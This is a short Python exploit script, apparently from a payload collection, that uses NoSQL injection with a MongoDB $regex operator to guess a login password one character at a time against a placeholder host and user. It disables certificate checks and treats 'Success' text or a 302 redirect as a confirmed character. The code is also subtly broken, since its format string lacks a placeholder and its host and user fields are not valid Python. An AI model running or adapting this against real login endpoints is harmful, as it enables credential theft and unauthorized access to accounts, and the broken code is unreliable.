import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()


password=""
u=<HOST>
headers={'content-type': 'application/json'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|']:
            payload='{"username":<USER>, "password": {"$regex": "<PASSWORD regex>' % (password + c)
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if 'Success' in r.text or r.status_code == 302:
                print("Found one more char : %s" % (password+c))
                password += c